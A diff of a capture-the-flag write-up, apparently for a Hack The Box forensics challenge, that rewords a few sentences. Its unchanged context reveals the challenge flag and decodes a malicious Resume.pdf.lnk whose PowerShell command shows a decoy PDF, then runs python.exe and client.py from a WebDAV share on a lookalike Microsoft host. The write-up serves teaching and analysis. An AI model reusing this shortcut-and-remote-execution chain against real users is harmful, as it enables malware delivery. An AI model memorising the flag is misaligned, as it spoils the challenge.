@@ -40,7 +40,7 @@ HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
 And we got the flag!
 
 ## The intended way
-The flag inside the configs file was so obvious. Let's return back to the endpoint that we discovered in the CV. Visiting the endpoint we have a Resume.pdf.lnk. Download it and check the metadata of the file:  
+The flag inside the configs file was so obvious. Let's turn back to the endpoint that we discovered in the CV. Revisiting the endpoint we have a Resume.pdf.lnk and download it. I began to check the metadata of the file:  
 ```bash
 └─$ exiftool Resume.pdf\ \ \(1\).download
 ExifTool Version Number         : 12.76
@@ -72,4 +72,4 @@ It's a cmd.exe and we also have the command line arguments. Let's try to decode 
 └─$ echo "WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJwBtAHMAZQBkAGcAZQAnACwAIAAnAGgAdAB0AHAAOgAvAC8AcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQA6ADMANAAyADgANgAvADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANAAvAHIAZQBzAHUAbQBlAHMAUwAvAHIAZQBzAHUAbQBlAF8AbwBmAGYAaQBjAGkAYQBsAC4AcABkAGYAJwApADsAXABcAHMAdABvAHIAYQBnAGUALgBtAGkAYwByAG8AcwBvAGYAdABjAGwAbwB1AGQAcwBlAHIAdgBpAGMAZQBzAC4AYwBvAG0AQAAzADQAMgA4ADYAXAAzAGYAZQAxADYAOQAwAGQAOQA1ADUAZQA4AGYAZAAyAGEAMABiADIAOAAyADUAMAAxADUANwAwAGUAMQBmADQAXABwAHkAdABoAG8AbgAzADEAMgBcAHAAeQB0AGgAbwBuAC4AZQB4AGUAIABcAFwAcwB0AG8AcgBhAGcAZQAuAG0AaQBjAHIAbwBzAG8AZgB0AGMAbABvAHUAZABzAGUAcgB2AGkAYwBlAHMALgBjAG8AbQBAADMANAAyADgANgBcADMAZgBlADEANgA5ADAAZAA5ADUANQBlADgAZgBkADIAYQAwAGIAMgA4ADIANQAwADEANQA3ADAAZQAxAGYANABcAGMAbwBuAGYAaQBnAHMAXABjAGwAaQBlAG4AdAAuAHAAeQA=" | base64 -d
 [System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:34286/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');\\storage.microsoftcloudservices.com@34286\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@34286\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
 ```
-Follow the configs endpoint and get the client.py. We should able to get the flag.  
+Follow the configs endpoint and get the client.py. We should able to get the flag too.
